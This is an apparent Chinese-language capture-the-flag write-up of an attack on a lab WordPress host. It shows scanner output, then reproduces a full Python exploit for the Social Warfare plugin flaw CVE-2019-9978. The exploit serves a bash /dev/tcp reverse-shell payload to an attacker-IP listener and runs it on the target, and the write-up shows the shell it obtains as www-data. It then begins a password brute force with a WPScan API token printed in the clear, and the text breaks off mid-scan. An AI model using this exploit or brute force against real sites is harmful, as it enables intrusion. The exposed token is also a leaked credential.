[192.168.2.43]<br>[+] Started: Wed Jul  2 21:11:29 2025<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.62 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://new.dsz/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://new.dsz/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://new.dsz/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://new.dsz/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://new.dsz/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br> |  - http://new.dsz/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentyfive<br> | Location: http://new.dsz/wp-content/themes/twentytwentyfive/<br> | Latest Version: 1.2 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2025-04-15T00:00:00.000Z<br> | Readme: http://new.dsz/wp-content/themes/twentytwentyfive/readme.txt<br> | Style URL: http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2<br> | Style Name: Twenty Twenty-Five<br> | Style URI: https://wordpress.org/themes/twentytwentyfive/<br> | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating Vulnerable Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] social-warfare<br> | Location: http://new.dsz/wp-content/plugins/social-warfare/<br> | Last Updated: 2025-03-18T09:37:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 4.5.6<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By:<br> |  Urls In 404 Page (Passive Detection)<br> |  Comment (Passive Detection)<br> |<br> | [!] 8 vulnerabilities identified:<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Arbitrary Settings Update<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/32085d2d-1235-42b4-baeb-bc43172a4972<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978<br> |      - https://wordpress.org/support/topic/malware-into-new-update/<br> |      - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/<br> |      - https://threatpost.com/wordpress-plugin-removed-after-zero-day-discovered/143051/<br> |      - https://twitter.com/warfareplugins/status/1108826025188909057<br> |      - https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Remote Code Execution (RCE)<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618<br> |      - https://www.webarxsecurity.com/social-warfare-vulnerability/<br> |<br> | [!] Title: Social Warfare &lt; 4.3.1 - Subscriber+ Post Meta Deletion<br> |     Fixed <span class="hljs-keyword">in</span>: 4.3.1<br> |     References:<br> |      - https://wpscan.com/vulnerability/5116068f-4b84-42ad-a88d-03e46096b41c<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0402<br> |<br> | [!] Title: Social Warfare &lt; 4.4.0 - Post Meta Deletion via CSRF<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.0<br> |     References:<br> |      - https://wpscan.com/vulnerability/7140abf5-5966-4361-bd51-ee29d3071a30<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0403<br> |<br> | [!] Title: Social Sharing Plugin - Social Warfare &lt; 4.4.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.4<br> |     References:<br> |      - https://wpscan.com/vulnerability/ab221b58-369e-4010-ae36-be099b2f4c9b<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4842<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f5b9aff-0833-4887-ae59-df5bc88c7f91<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6.2 - Authenticated(Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6.2<br> |     References:<br> |      - https://wpscan.com/vulnerability/26ad138e-990a-4401-84e4-ea694ccf6e7f<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1959<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1016f16c-0ab2-4cac-a7a5-8d93a37e7894<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6 - Cross-Site Request Forgery<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/acb8b33c-6b74-4d65-a3a5-5cad0c1ea8b0<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34825<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f105bee6-21b2-4014-bb0a-9e53c49e29b0<br> |<br> | [!] Title: Social Warfare &lt; 4.5.6 - Contributor+ Stored XSS<br> |     Fixed <span class="hljs-keyword">in</span>: 4.5.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/447065f5-f2f9-4e0c-b524-c730655f3d79<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26973<br> |      - https://patchstack.com/database/wordpress/plugin/social-warfare/vulnerability/wordpress-social-warfare-plugin-4-5-4-cross-site-scripting-xss-vulnerability<br> |<br> | Version: 3.5.2 (100% confidence)<br> | Found By: Comment (Passive Detection)<br> |  - http://new.dsz/, Match: <span class="hljs-string">&#x27;Social Warfare v3.5.2&#x27;</span><br> | Confirmed By:<br> |  Query Parameter (Passive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;=================================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] maze-sec<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://new.dsz/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Rss Generator (Aggressive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] todd<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] hyh<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] sublarge<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] WPScan DB API OK<br> | Plan: free<br> | Requests Done (during the scan): 4<br> | Requests Remaining: 17<br><br>[+] Finished: Wed Jul  2 21:11:46 2025<br>[+] Requests Done: 69<br>[+] Cached Requests: 8<br>[+] Data Sent: 18.079 KB<br>[+] Data Received: 703.923 KB<br>[+] Memory used: 277.141 MB<br>[+] Elapsed <span class="hljs-keyword">time</span>: 00:00:16<br></code></pre></td></tr></table></figure><p>找到一个漏洞<code>Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Remote Code Execution (RCE)</code></p><h2 id="2、Getshell"><a href="#2、Getshell" class="headerlink" title="2、Getshell"></a>2、Getshell</h2><h3 id="1-CVE-2019-9978漏洞利用"><a href="#1-CVE-2019-9978漏洞利用" class="headerlink" title="1-CVE-2019-9978漏洞利用"></a>1-CVE-2019-9978漏洞利用</h3><p>该 版 本<code> Social Warfare v3.5.2</code> 存 在<code> CVE-2019-9978</code> 漏 洞<br><code>https: //www.exploit-db.com/exploits/52346</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># Exploit Title: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)</span><br><span class="hljs-comment"># Date: 25-06-2025</span><br><span class="hljs-comment"># Exploit Author: Huseyin Mardini (@housma)</span><br><span class="hljs-comment"># Original Researcher: Luka Sikic</span><br><span class="hljs-comment"># Original Exploit Author: hash3liZer</span><br><span class="hljs-comment"># Vendor Homepage: https://wordpress.org/plugins/social-warfare/</span><br><span class="hljs-comment"># Software Link: https://downloads.wordpress.org/plugin/social-warfare.3.5.2.zip</span><br><span class="hljs-comment"># Version: &lt;= 3.5.2</span><br><span class="hljs-comment"># CVE: CVE-2019-9978</span><br><span class="hljs-comment"># Tested On: WordPress 5.1.1 with Social Warfare 3.5.2 (on Ubuntu 20.04)</span><br><span class="hljs-comment"># Python Version: Python 3.x</span><br><span class="hljs-comment"># Reference: https://www.exploit-db.com/exploits/46794</span><br><span class="hljs-comment"># Github (original PoC): https://github.com/hash3liZer/CVE-2019-9978</span><br><br><span class="hljs-comment"># The currently listed exploit for *CVE-2019-9978* (Exploit ID 46794&lt;https://www.exploit-db.com/exploits/46794&gt;) appears to no longer work as intended in many modern environments</span><br><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#   1. Edit the config section below and replace `ATTACKER_IP` with your machine&#x27;s IP.</span><br><span class="hljs-comment">#   2. Run the script: `python3 exploit.py`</span><br><span class="hljs-comment">#   3. It will:</span><br><span class="hljs-comment">#       - Create a PHP payload and save it as `payload.txt` (or any filename you set in PAYLOAD_FILE)</span><br><span class="hljs-comment">#       - Start an HTTP server on `HTTP_PORT` to host the payload</span><br><span class="hljs-comment">#       - Start a Netcat listener on `LISTEN_PORT`</span><br><span class="hljs-comment">#       - Trigger the vulnerability via the vulnerable `swp_debug` parameter</span><br><span class="hljs-comment">#   4. On success, you get a reverse shell as `www-data`.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Note:</span><br><span class="hljs-comment">#   - PAYLOAD_FILE defines only the name of the file to be created and served.</span><br><span class="hljs-comment">#   - Make sure ports 8001 and 4444 are open and not in use.</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> http.server<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># --- Config ---</span><br>TARGET_URL = <span class="hljs-string">&quot;http://example.com&quot;</span> <span class="hljs-comment"># Change to your attack wordpress</span><br>ATTACKER_IP = <span class="hljs-string">&quot;xxx.xxx.xx.xx&quot;</span>  <span class="hljs-comment"># Change to your attack box IP</span><br>HTTP_PORT = <span class="hljs-number">8000</span><br>LISTEN_PORT = <span class="hljs-number">4444</span><br>PAYLOAD_FILE = <span class="hljs-string">&quot;payload.txt&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payload</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Write exact reverse shell payload using valid PHP syntax&quot;&quot;&quot;</span><br>    payload = <span class="hljs-string">f&#x27;&lt;pre&gt;system(&quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;ATTACKER_IP&#125;</span>/<span class="hljs-subst">&#123;LISTEN_PORT&#125;</span> 0&gt;&amp;1\\&quot;&quot;)&lt;/pre&gt;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(PAYLOAD_FILE, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Payload written to <span class="hljs-subst">&#123;PAYLOAD_FILE&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_http_server</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Serve payload over HTTP&quot;&quot;&quot;</span><br>    handler = http.server.SimpleHTTPRequestHandler<br>    <span class="hljs-keyword">with</span> socketserver.TCPServer((<span class="hljs-string">&quot;&quot;</span>, HTTP_PORT), handler) <span class="hljs-keyword">as</span> httpd:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] HTTP server running at port <span class="hljs-subst">&#123;HTTP_PORT&#125;</span>&quot;</span>)<br>        httpd.serve_forever()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_listener</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Start Netcat listener&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Listening on port <span class="hljs-subst">&#123;LISTEN_PORT&#125;</span> for reverse shell...&quot;</span>)<br>    subprocess.call([<span class="hljs-string">&quot;nc&quot;</span>, <span class="hljs-string">&quot;-lvnp&quot;</span>, <span class="hljs-built_in">str</span>(LISTEN_PORT)])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_exploit</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Trigger the exploit with vulnerable parameter&quot;&quot;&quot;</span><br>    payload_url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;ATTACKER_IP&#125;</span>:<span class="hljs-subst">&#123;HTTP_PORT&#125;</span>/<span class="hljs-subst">&#123;PAYLOAD_FILE&#125;</span>&quot;</span><br>    exploit = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=<span class="hljs-subst">&#123;payload_url&#125;</span>&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Sending exploit: <span class="hljs-subst">&#123;exploit&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        requests.get(exploit, timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    create_payload()<br><br>    <span class="hljs-comment"># Start web server in background</span><br>    http_thread = threading.Thread(target=start_http_server, daemon=<span class="hljs-literal">True</span>)<br>    http_thread.start()<br>    time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># Give server time to start</span><br><br>    <span class="hljs-comment"># Start listener in background</span><br>    listener_thread = threading.Thread(target=start_listener)<br>    listener_thread.start()<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># Send the malicious request</span><br>    send_exploit()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        main()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Interrupted by user.&quot;</span>)<br></code></pre></td></tr></table></figure><p>修改目标地址和本机IP后，直接使用脚本运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec]<br>└─# vi exploit.py<br><br>┌──(root㉿kali)-[/miao/maze-sec]<br>└─# python3 exploit.py        <br>[+] Payload written to payload.txt<br>[+] HTTP server running at port 8000<br>[+] Listening on port 4444 <span class="hljs-keyword">for</span> reverse shell...<br>listening on [any] 4444 ...<br>[+] Sending exploit: http://new.dsz/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://192.168.2.4:8000/payload.txt<br>192.168.2.43 - - [02/Jul/2025 21:38:53] <span class="hljs-string">&quot;GET /payload.txt?swp_debug=get_user_options HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure><p>成功获取到<code>www-data</code>的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# nc -lvnp 4444        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.43] 55424<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (471): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@New:/var/www/new.dsz/wp-admin$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><h3 id="2-Wordpress密码爆破"><a href="#2-Wordpress密码爆破" class="headerlink" title="2-Wordpress密码爆破"></a>2-Wordpress密码爆破</h3><p>根据<code>wpscan</code>扫描到的用户<code>maze-sec</code>，<code>todd</code>，<code>hyh</code>，<code>sublarge</code>，尝试进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# bash generate_by_username.sh sublarge &gt; pass .txt<br><br>┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# wpscan --url http://new.dsz/ --api-token Jrh7ozpao7LtkyqVZwMeXCKeqJN0zHplyeG8SaQU124 -U sublarge -P pass.txt <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.27<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://new.dsz/ [192.168.2.43]<br>[+] Started: Wed Jul  2 22:53:39 2025<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.62 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://new.dsz/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://new.dsz/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://new.dsz/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://new.dsz/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://new.dsz/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br> |  - http://new.dsz/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentyfive<br> | Location: http://new.dsz/wp-content/themes/twentytwentyfive/<br> | Latest Version: 1.2 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2025-04-15T00:00:00.000Z<br> | Readme: http://new.dsz/wp-content/themes/twentytwentyfive/readme.txt<br> | Style URL: http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2<br> | Style Name: Twenty Twenty-Five<br> | Style URI: https://wordpress.org/themes/twentytwentyfive/<br> | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] 